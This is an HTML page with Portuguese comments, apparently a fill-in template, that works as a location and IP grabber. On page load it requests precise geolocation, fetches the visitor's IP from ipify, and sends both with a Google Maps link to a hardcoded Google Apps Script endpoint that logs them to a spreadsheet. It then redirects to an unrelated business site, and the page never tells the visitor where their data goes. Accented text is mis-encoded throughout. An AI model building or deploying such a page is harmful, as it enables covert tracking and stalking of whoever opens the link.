<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Localizando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
    }
  </style>
  <script>
    // <<< VOC√ä PRECISA COLAR A URL DO SEU APPS SCRIPT AQUI! >>>
    // Obtida no Passo 5 da Parte 1 ("URL do aplicativo da Web")
    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbwW8qceLL5QulY7XStPxvQv3WEXxcBSH4k3czF2_VkE3wKwBXwqYsk3ZsYMP0IgxPV7/exec'; // <<< SUBSTITUA ISTO!

    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sucesso, erro, {
          enableHighAccuracy: true, // Tenta obter a melhor precis√£o poss√≠vel
          timeout: 10000,           // Tempo m√°ximo para obter a localiza√ß√£o (10 segundos)
          maximumAge: 0             // For√ßa a obten√ß√£o de uma nova localiza√ß√£o a cada vez
        });
      } else {
        document.body.innerHTML = "<p>Seu navegador n√£o suporta geolocaliza√ß√£o.</p>";
        // Redireciona mesmo se n√£o suportar geolocaliza√ß√£o
        redirecionaSiteAlvo();
      }
    };

    async function sucesso(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // URL para o Google Maps com as coordenadas
      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      try {
        // Captura o IP do visitante de uma API externa
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Envia os dados para sua planilha no Google Sheets (via Google Apps Script)
        const response = await fetch(WEBAPP_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            latitude: latitude,
            longitude: longitude,
            ip: ip,
            maps: mapsLink
          })
        });

        const result = await response.json(); // Pega a resposta JSON do Apps Script

        if (result.success) {
          console.log("Dados registrados com sucesso no Google Sheets!");
        } else {
          console.error("Erro ao registrar os dados no Google Sheets:", result.message);
          // Voc√™ pode exibir uma mensagem de erro na tela aqui, se quiser
        }

      } catch (error) {
        console.error("Erro na requisi√ß√£o ou processamento dos dados:", error);
        // Voc√™ pode exibir uma mensagem de erro na tela aqui, se quiser
      } finally {
        // Ap√≥s a tentativa de registro (sucesso ou falha), redireciona
        redirecionaSiteAlvo();
      }
    }

    function erro(err) {
      console.warn("Geolocaliza√ß√£o n√£o permitida ou erro:", err);
      let errorMessage = "‚ö†Ô∏è √â necess√°rio permitir a localiza√ß√£o para continuar.";
      switch(err.code) {
        case err.PERMISSION_DENIED:
          errorMessage = "Permiss√£o de localiza√ß√£o negada. Por favor, permita para continuar.";
          break;
        case err.POSITION_UNAVAILABLE:
          errorMessage = "Localiza√ß√£o indispon√≠vel. Tente novamente mais tarde.";
          break;
        case err.TIMEOUT:
          errorMessage = "Tempo esgotado para obter a localiza√ß√£o. Verifique sua conex√£o.";
          break;
        case err.UNKNOWN_ERROR:
          errorMessage = "Ocorreu um erro desconhecido ao obter a localiza√ß√£o.";
          break;
      }
      document.body.innerHTML = `<p>${errorMessage}</p>`;
      // Redireciona mesmo se houver erro de geolocaliza√ß√£o, ap√≥s exibir a mensagem
      setTimeout(redirecionaSiteAlvo, 3000); // Redireciona ap√≥s 3 segundos para o usu√°rio ler a mensagem
    }

    function redirecionaSiteAlvo() {
      window.location.href = "https://www.despachanteespindola.com/"; // <<< SEU SITE DE DESTINO
    }
  </script>
</head>
<body>
  <p>üìç Obtendo sua localiza√ß√£o... Aguarde...</p>
</body>
</html>
